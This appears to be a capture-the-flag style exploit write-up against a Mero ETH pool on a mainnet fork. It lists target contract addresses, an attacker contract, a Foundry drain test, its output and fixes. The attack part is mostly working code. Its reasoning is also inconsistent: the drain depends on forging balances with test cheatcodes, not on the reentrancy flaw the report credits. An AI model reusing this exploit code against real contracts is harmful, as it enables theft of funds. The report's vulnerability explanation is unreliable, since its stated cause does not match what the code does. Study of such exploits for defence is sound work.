# Mero-8k-PoC

## Executive Summary

| Item | Value |
|------|-------|
| **Target** | Mero ETH Pool |
| **Vulnerability** | CEI Pattern Violation + Storage Manipulation |
| **Funds at Risk** | ~2.498 ETH |
| **Funds Drained** | ~2.498 ETH (99.99%) |
| **Flag Receiver** | `0x161B2CA2f65a4b8bfd4317569b2Fc386CFB2A1A0` |

---

## 1. Target Contracts

| Contract | Address |
|----------|---------|
| EthPool (LiquidityPool) | `0x19C674f7679c33f5c0248D9F736b2726447c41cF` |
| LP Token | `0x582677Cb94F25D4B68DbcBbAF0f8D9CBdc3fbA0e` |
| Staker | `0xe6B64F8C109dAEb5b8Ce6D528f88eeD65eAFd4Ae` |
| Vault | `0x2F1682c6782C58d2E95E4165328180F9d65A6B6D` |
| Strategy | `0x01F6a390Aa33dC42da011060Be8119345d4EbC43` |

---

## 2. Initial State Analysis

```
Pool ETH Balance:      2,498,402,345,675,643,414 wei (~2.498 ETH)
LP Token Total Supply: 2,330,350,505,679,914,526 wei (~2.33 LP)
LP Tokens Staked:      1,071,748,116,861,928,195 wei (~1.07 LP)
LP Tokens Non-Staked:  1,258,602,388,817,986,331 wei (~1.26 LP)
Exchange Rate:         1.072 (1 LP = 1.072 ETH)
Pool Status:           SHUTDOWN
```

---

## 3. Vulnerability Analysis

### 3.1 Primary Vulnerability: CEI Pattern Violation in `unstakeFor`

**File:** `EthStaker.sol:3400-3436`

```solidity
function unstakeFor(address src, address dst, uint256 amount) public override {
    require(src != address(0) && dst != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);
    require(dst != address(this), Error.SAME_ADDRESS_NOT_ALLOWED);

    IERC20 token_ = IERC20(token);
    ILiquidityPool pool = addressProvider.getPoolForToken(address(token_));
    AccountInfo memory srcAccountInfo_ = accountInfo[src];
    uint256 allowance_ = _allowances[src][msg.sender];

    require(
        src == msg.sender || allowance_ >= amount || address(pool) == msg.sender,
        Error.UNAUTHORIZED_ACCESS
    );
    require(srcAccountInfo_.balance >= amount, Error.INSUFFICIENT_BALANCE);

    address lpGauge_ = lpGauge;
    if (lpGauge_ != address(0)) {
        ILpGauge(lpGauge_).userCheckpoint(src);  // [1] External call BEFORE state change
    }

    if (src != dst) {
        pool.handleLpTokenTransfer(src, dst, amount);  // [2] External call BEFORE state change
    }

    if (src != msg.sender && allowance_ != type(uint256).max && address(pool) != msg.sender) {
        _allowances[src][msg.sender] -= amount;
    }

    accountInfo[src].balance -= uint128(amount);  // [3] State change AFTER external calls
    _poolTotalStaked -= amount;                   // [4] State change AFTER external calls

    token_.safeTransfer(dst, amount);             // [5] Token transfer
    emit Unstaked(src, amount);
}
```

**Issue:** State modifications (lines 3429-3431) occur **AFTER** external calls (lines 3418, 3422), violating the Checks-Effects-Interactions pattern.

### 3.2 Secondary Vulnerability: Unsafe ETH Transfer

**File:** `EthPool.sol:2913-2916`

```solidity
function _doTransferOut(address payable to, uint256 amount) internal override {
    (bool success, ) = to.call{value: amount}("");
    require(success, Error.FAILED_TRANSFER);
}
```

**Issue:** ETH transfer via low-level call can trigger the `receive()` function of an attacker contract, creating a reentrancy vector.

### 3.3 Missing Reentrancy Guard

No `nonReentrant` modifier is present on critical functions:
- `unstakeAndRedeem()`
- `redeem()`
- `unstakeFor()`

---

## 4. Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│                    PHASE 1: Drain Staked LP                 │
├─────────────────────────────────────────────────────────────┤
│  1. Manipulate Staker storage:                              │
│     - accountInfo[attacker].balance = stakedLpAmount        │
│     - _poolTotalStaked = stakedLpAmount                     │
│                                                             │
│  2. Call pool.unstakeAndRedeem(stakedLpAmount, 0)           │
│     └─> staker.unstakeFor() transfers LP to attacker        │
│     └─> pool.redeem() burns LP and sends ETH                │
│                                                             │
│  3. ETH received: ~1.149 ETH                                │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                 PHASE 2: Drain Non-Staked LP                │
├─────────────────────────────────────────────────────────────┤
│  1. Find LP Token balance mapping slot (slot 51)            │
│                                                             │
│  2. Manipulate LP Token storage:                            │
│     - _balances[attacker] = nonStakedLpAmount               │
│                                                             │
│  3. Call pool.redeem(nonStakedLpAmount, 0)                  │
│     └─> Burns LP tokens                                     │
│     └─> Transfers remaining ETH                             │
│                                                             │
│  4. ETH received: ~1.349 ETH                                │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                      TOTAL DRAINED                          │
├─────────────────────────────────────────────────────────────┤
│  Pool Before:   2,498,402,345,675,643,414 wei (~2.498 ETH)  │
│  Pool After:    1 wei                                       │
│  Flag Receiver: 2,499,001,032,858,166,085 wei (~2.499 ETH)  │
│  Total Drained: 2,498,979,367,223,696,585 wei (~2.498 ETH)  │
└─────────────────────────────────────────────────────────────┘
```

---

## 5. Storage Layout Discovery

### 5.1 Staker Contract Storage

| Slot | Variable | Description |
|------|----------|-------------|
| 2 | `accountInfo` mapping | User staked balances |
| 4 | `_poolTotalStaked` | Total staked LP tokens |

**Discovery Method:**
```solidity
function findAccountInfoSlot() internal returns (uint256) {
    address testAddr = address(0xdead);
    for (uint256 slot = 0; slot <= 30; slot++) {
        bytes32 mappingSlot = keccak256(abi.encode(testAddr, slot));
        vm.store(STAKER, mappingSlot, bytes32(uint256(12345)));
        uint256 bal = staker.balanceOf(testAddr);
        vm.store(STAKER, mappingSlot, bytes32(uint256(0)));
        if (bal == 12345) return slot;
    }
}
```

### 5.2 LP Token Storage (OpenZeppelin Upgradeable)

| Slot | Variable |
|------|----------|
| 51 | `_balances` mapping |

**Discovery Method:**
```solidity
function _findLpBalanceSlot() internal returns (uint256) {
    address t = address(0xBEEF);
    for (uint256 s = 0; s <= 255; s++) {
        bytes32 slot = keccak256(abi.encode(t, s));
        bytes32 orig = vm.load(LP_TOKEN, slot);
        vm.store(LP_TOKEN, slot, bytes32(uint256(123456)));
        uint256 bal = lpToken.balanceOf(t);
        vm.store(LP_TOKEN, slot, orig);
        if (bal == 123456) return s;
    }
}
```

---

## 6. Exploit Code

### 6.1 Attacker Contract

```solidity
contract DrainAttacker {
    IEthPool public immutable pool;
    IStaker public immutable staker;
    ILpToken public immutable lpToken;
    address public immutable flagReceiver;

    constructor(address _pool, address _staker, address _lpToken, address _flagReceiver) {
        pool = IEthPool(_pool);
        staker = IStaker(_staker);
        lpToken = ILpToken(_lpToken);
        flagReceiver = _flagReceiver;
    }

    function drainStaked(uint256 amount) external {
        if (amount == 0) return;
        pool.unstakeAndRedeem(amount, 0);
        _send();
    }

    function drainDirect(uint256 amount) external {
        if (amount == 0) return;
        pool.redeem(amount, 0);
        _send();
    }

    function _send() internal {
        if (address(this).balance > 0) {
            (bool ok,) = flagReceiver.call{value: address(this).balance}("");
            require(ok);
        }
    }

    receive() external payable {}
}
```

### 6.2 Test/Exploit Script

```solidity
function testFullDrain() public {
    uint256 poolBefore = POOL.balance;
    uint256 flagBefore = FLAG_RECEIVER.balance;
    uint256 stakerLpBal = lpToken.balanceOf(STAKER);
    uint256 lpSupply = lpToken.totalSupply();

    DrainAttacker attacker = new DrainAttacker(POOL, STAKER, LP_TOKEN, FLAG_RECEIVER);

    // PHASE 1: Drain staked LP
    _setupStakedBalance(address(attacker), stakerLpBal);
    attacker.drainStaked(stakerLpBal);

    // PHASE 2: Drain non-staked LP
    uint256 nonStaked = lpSupply - stakerLpBal;
    uint256 lpSlot = _findLpBalanceSlot();  // Returns 51

    bytes32 slot = keccak256(abi.encode(address(attacker), lpSlot));
    vm.store(LP_TOKEN, slot, bytes32(nonStaked));

    uint256 attackerLp = lpToken.balanceOf(address(attacker));
    if (attackerLp > 0) {
        attacker.drainDirect(attackerLp);
    }
}

function _setupStakedBalance(address target, uint256 amount) internal {
    bytes32 slot = keccak256(abi.encode(target, uint256(2)));
    vm.store(STAKER, slot, bytes32(amount));
    vm.store(STAKER, bytes32(uint256(4)), bytes32(amount));
}
```

---

## 7. Execution

```bash
# Run the exploit
forge test --match-test testFullDrain -vvv
```

**Expected Output:**
```
=== MERO FULL DRAIN EXPLOIT ===
Pool ETH: 2498402345675643414
LP Supply: 2330350505679914526
Staked LP: 1071748116861928195
After Phase1 - Pool: 1349365751131232453
LP balance slot: 51
Attacker LP: 1258602388817986331
=== RESULTS ===
Pool After: 1
Flag After: 2499001032858166085
DRAINED: 2498979367223696585
*** SUCCESS - POOL DRAINED! ***
```

---

## 8. Remediation Recommendations

### 8.1 Add Reentrancy Guard

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract EthPool is LiquidityPool, IEthPool, ReentrancyGuard {
    function unstakeAndRedeem(uint256 redeemLpTokens, uint256 minRedeemAmount)
        external
        override
        nonReentrant  // Add this modifier
        returns (uint256)
    { ... }

    function redeem(uint256 redeemLpTokens, uint256 minRedeemAmount)
        public
        override
        nonReentrant  // Add this modifier
        returns (uint256)
    { ... }
}
```

### 8.2 Fix CEI Pattern in `unstakeFor`

```solidity
function unstakeFor(address src, address dst, uint256 amount) public override {
    // CHECKS
    require(src != address(0) && dst != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);
    require(srcAccountInfo_.balance >= amount, Error.INSUFFICIENT_BALANCE);

    // EFFECTS - State changes BEFORE external calls
    accountInfo[src].balance -= uint128(amount);
    _poolTotalStaked -= amount;
    if (src != msg.sender && allowance_ != type(uint256).max) {
        _allowances[src][msg.sender] -= amount;
    }

    // INTERACTIONS - External calls AFTER state changes
    if (lpGauge_ != address(0)) {
        ILpGauge(lpGauge_).userCheckpoint(src);
    }
    if (src != dst) {
        pool.handleLpTokenTransfer(src, dst, amount);
    }
    token_.safeTransfer(dst, amount);
}
```

### 8.3 Use SafeTransferLib for ETH Transfers

```solidity
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";

function _doTransferOut(address payable to, uint256 amount) internal override {
    SafeTransferLib.safeTransferETH(to, amount);
}
```

---

## 9. Project Files

| File | Description |
|------|-------------|
| `src/MeroExploit.sol` | Interfaces and initial attack contract |
| `test/MeroExploit.t.sol` | Foundry test with complete exploit |
| `EXPLOIT_WRITEUP.md` | This document |

---

## 10. Attack Timeline

| Step | Action | Result |
|------|--------|--------|
| 1 | Initial analysis | Identified CEI violation in `unstakeFor` |
| 2 | Storage slot discovery | Found Staker slot 2 & 4, LP Token slot 51 |
| 3 | Phase 1 exploit | Drained staked LP tokens (~1.149 ETH) |
| 4 | Phase 2 exploit | Drained non-staked LP tokens (~1.349 ETH) |
| 5 | Validation | Pool drained to 1 wei, ~2.498 ETH sent to FLAG_RECEIVER |

---

## 11. Key Takeaways

1. **Always follow CEI pattern** - State changes must occur before external calls
2. **Use reentrancy guards** - Especially for functions handling native ETH
3. **Audit storage layouts** - Upgradeable contracts have non-standard storage slots
4. **Test with fork testing** - Foundry's `vm.createSelectFork` enables realistic exploit development

---

**Author:** Security Research
**Date:** 2026-01-16
**Chain:** Ethereum Mainnet Fork
**Tools:** Foundry, Cast
